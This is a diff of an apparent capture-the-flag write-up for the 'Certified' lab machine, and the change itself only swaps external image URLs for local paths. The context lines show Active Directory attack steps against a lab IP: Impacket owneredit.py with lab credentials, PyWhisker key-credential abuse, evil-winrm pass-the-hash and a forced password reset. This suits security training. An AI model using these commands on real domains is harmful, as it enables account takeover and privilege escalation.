@@ -61,7 +61,7 @@ This generated a ZIP file containing the **bloodhound** data, which we imported 
 
 In **bloodhound**, we discovered that judith.mader had WriteOwner privileges over the Management group. This allowed us to take ownership of the group and grant ourselves additional rights.
 
-[![](https://nutzh.top/wp-content/uploads/2025/01/judith.png)](https://nutzh.top/wp-content/uploads/2025/01/judith.png)We used the owneredit.py script from **Impacket** to take ownership of the Management group:
+[![](/mdx_images/2025/01/judith.png)](/mdx_images/2025/01/judith.png)We used the owneredit.py script from **Impacket** to take ownership of the Management group:
 
 ```bash
 $ python3 owneredit.py -action write -new-owner "judith.mader" -target "MANAGEMENT" -dc-ip 10.10.11.41 'certified.htb/judith.mader:judith09'
@@ -99,7 +99,7 @@ CERTIFIEDmanagement_svc
 
 With judith.mader now a member of the Management group, we explored further privileges in **bloodhound**. We discovered that judith.mader had **GenericWrite** privileges over the management\_svc account.
 
-[![](https://nutzh.top/wp-content/uploads/2025/01/management-1.png)](https://nutzh.top/wp-content/uploads/2025/01/management-1.png)### Step 1: Exploiting GenericWrite with PyWhisker
+[![](/mdx_images/2025/01/management-1.png)](/mdx_images/2025/01/management-1.png)### Step 1: Exploiting GenericWrite with PyWhisker
 
 We used PyWhisker to add a new Key Credential to the management\_svc account:
 
@@ -163,7 +163,7 @@ $ evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a129558
 
 In **bloodhound**, we noticed that management\_svc had **GenericAll** privileges over the CA\_OPERATOR account.
 
-[![](https://nutzh.top/wp-content/uploads/2025/01/CA_op.png)](https://nutzh.top/wp-content/uploads/2025/01/CA_op.png)We used this to reset the password for CA\_OPERATOR:
+[![](/mdx_images/2025/01/CA_op.png)](/mdx_images/2025/01/CA_op.png)We used this to reset the password for CA\_OPERATOR:
 
 ```bash
 $ *Evil-WinRM* PS C:Usersmanagement_svcDocuments> Set-ADAccountPassword -Identity "CA_OPERATOR" -NewPassword (ConvertTo-SecureString "Hopeyoulike
